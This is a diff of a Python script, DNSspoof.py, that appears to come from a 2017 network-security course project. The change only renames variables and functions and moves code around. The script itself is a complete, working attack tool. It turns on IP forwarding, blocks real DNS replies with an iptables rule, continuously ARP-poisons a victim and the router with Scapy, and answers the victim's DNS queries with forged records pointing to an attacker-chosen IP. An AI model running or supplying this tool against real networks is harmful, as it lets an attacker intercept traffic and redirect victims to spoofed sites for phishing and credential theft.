@@ -1,14 +1,14 @@
 #  =================================================================
 #  SOURCE FILE:    DNSspoof.py
 #
-#  PROGRAM:        ARP Posisoning a victim machine, responding with spoofed DNS responses.
+#  PROGRAM:        ARP Posisoning a victim machine, replying with spoofed DNS responses.
 #
 #  DATE: October 24, 2017
 #
 #
 #  DESIGNERS: Paul Cabanez & Justin Chau
 #
-#  python spoof.py -v 192.168.0.11 -i 192.168.0.10 -r 192.168.0.100 -t 24.80.73.161
+#  python DNSspoof.py -v 192.168.0.11 -t 24.80.73.161 -r 192.168.0.100
 #
 #  NOTES:
 #  Our Attacking machine initiates ARP Poisoning on the victim machine.
@@ -23,21 +23,31 @@ from multiprocessing import Process
 from subprocess import Popen, PIPE
 import argparse, threading, time, re
 
-#parse command line arguments
+#command line arguments
 parser = argparse.ArgumentParser(description='ARP Poisoning and DNS Spoofing')
-parser.add_argument('-v', '--victim', dest='victimIP', help="IP Address of the victim", required=True)
-parser.add_argument('-i', '--ip', dest='localIP', help="Our IP Address", required=True)
-parser.add_argument('-r', '--router', dest='routerIP', help="IP Address of the Router", required=True)
-parser.add_argument('-t', '--target', dest='targetIP', help="IP Address of our DNS Responder", required=True)
+parser.add_argument('-v', '--victim', dest='victimIP', help="IP Address of victim", required=True)
+parser.add_argument('-t', '--target', dest='targetIP', help="IP Address of spoof site", required=True)
+parser.add_argument('-r', '--router', dest='routerIP', help="IP Address of Router", required=True)
 
 args = parser.parse_args()
-victimIP = args.victimIP
-localIP = args.localIP
-routerIP = args.routerIP
+vIP = args.victimIP
 targetIP = args.targetIP
+routerIP = args.routerIP
 localMAC = ""
 victimMAC = ""
 routerMAC = ""
+
+#Setup function
+def setup():
+    #setup forwarding rules
+    #disable forwarding of DNS requests to router
+    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+    #iptables rule
+    Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=PIPE)
+
+#Flush iptables on exit
+def reset():
+    Popen(["iptables -F"], shell=True, stdout=PIPE)
 
 #get MACaddress of local machine
 def getOurMAC(interface):
@@ -45,18 +55,15 @@ def getOurMAC(interface):
         mac = open('/sys/class/net/'+interface+'/address').readline()
     except:
         mac = "00:00:00:00:00:00"
-
     return mac[0:17]
 
 
 #returns MAC address of victim IP
-def getMAC(IP):
-
-    #ping to add the target to our system's ARP cache
+def getTargetMAC(IP):
+    #add the target to our system's ARP cache
     pingResult = Popen(["ping", "-c 1", IP], stdout=PIPE)
     pid = Popen(["arp", "-n", IP], stdout=PIPE)
     s = pid.communicate()[0]
-
     MAC = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
 
     return MAC
@@ -64,11 +71,9 @@ def getMAC(IP):
 
 #constructs and sends arp packets to send to router and to victim.
 def ARPpoison(localMAC, victimMAC, routerMAC):
-
-    arpPacketVictim = Ether(src=localMAC, dst=victimMAC)/ARP(hwsrc=localMAC, hwdst=victimMAC, psrc=routerIP, pdst=victimIP, op=2)
-    arpPacketRouter = Ether(src=localMAC, dst=routerMAC)/ARP(hwsrc=localMAC, hwdst=routerMAC, psrc=victimIP, pdst=routerIP, op=2)
-
-    print str(victimIP) + " has been poisoned."
+    arpPacketVictim = Ether(src=localMAC, dst=victimMAC)/ARP(hwsrc=localMAC, hwdst=victimMAC, psrc=routerIP, pdst=vIP, op=2)
+    arpPacketRouter = Ether(src=localMAC, dst=routerMAC)/ARP(hwsrc=localMAC, hwdst=routerMAC, psrc=vIP, pdst=routerIP, op=2)
+    print str(vIP) + " has been poisoned."
     while True:
         try:
             sendp(arpPacketVictim, verbose=0)
@@ -79,61 +84,42 @@ def ARPpoison(localMAC, victimMAC, routerMAC):
             sys.exit(0)
 
 #construct and send a spoofed DNS response packet to the victim
-def respond(packet):
+def reply(packet):
     global targetIP
-    responsePacket = (IP(dst=victimIP, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
+    responsePacket = (IP(dst=vIP, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                     DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=targetIP)))
-
     send(responsePacket, verbose=0)
-    print "Forwarded spoofed DNS Packet"
-    #print "Received: "+ str(targetIP)
+    print "Sent spoofed DNS Packet"
     return
 
 #this parse creates a thread
 def parse(packet):
-
     if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
-        respondThread = threading.Thread(target=respond, args=packet)
-        respondThread.start()
+        replyThread = threading.Thread(target=reply, args=packet)
+        replyThread.start()
 
 #initiate sniff filter for DNS requests
 def DNSsniffer():
-    global victimIP
-    print "Sniffing DNS Requests"
-    sniffFilter = "udp and port 53 and src " +str(victimIP)
+    global vIP
+    print "Sniffing DNS"
+    sniffFilter = "udp and port 53 and src " +str(vIP)
     sniff(filter=sniffFilter, prn=parse)
 
-#invoked on user exit. Flush iptables rules
-def reset():
-    Popen(["iptables -F"], shell=True, stdout=PIPE)
-
-#Setup function
-def setup():
-    #setup forwarding rules
-    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-    #disable forwarding of DNS requests to router
-    #iptables rule
-    Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=PIPE)
-
+# main function
 def main():
-    setup()
+    victimMAC = getTargetMAC(vIP)
+    localMAC = getOurMAC("eno1")#Datacomm card
+    routerMAC = getTargetMAC(routerIP)
 
-    victimMAC = getMAC(victimIP)
-    #Datacomm card
-    localMAC = getOurMAC("eno1")
-    routerMAC = getMAC(routerIP)
-
-    #seperate threads for ARP poisoning and DNS spoofing
+    #threads creation
     ARPThread = threading.Thread(target=ARPpoison, args=(localMAC, victimMAC, routerMAC))
     sniffThread = threading.Thread(target=DNSsniffer)
-
-    #make threads daemons, so that when the main thread receives KeyboardInterrupt the whole process terminates
+    #
     ARPThread.daemon = True
     sniffThread.daemon = True
-
+    #
     ARPThread.start()
     sniffThread.start()
-
 
     #Keyboard Interrupt
     while True:
@@ -144,5 +130,6 @@ def main():
             print "Exiting"
             sys.exit(0)
 
-
+#--------------------------------------------------
+setup()
 main()
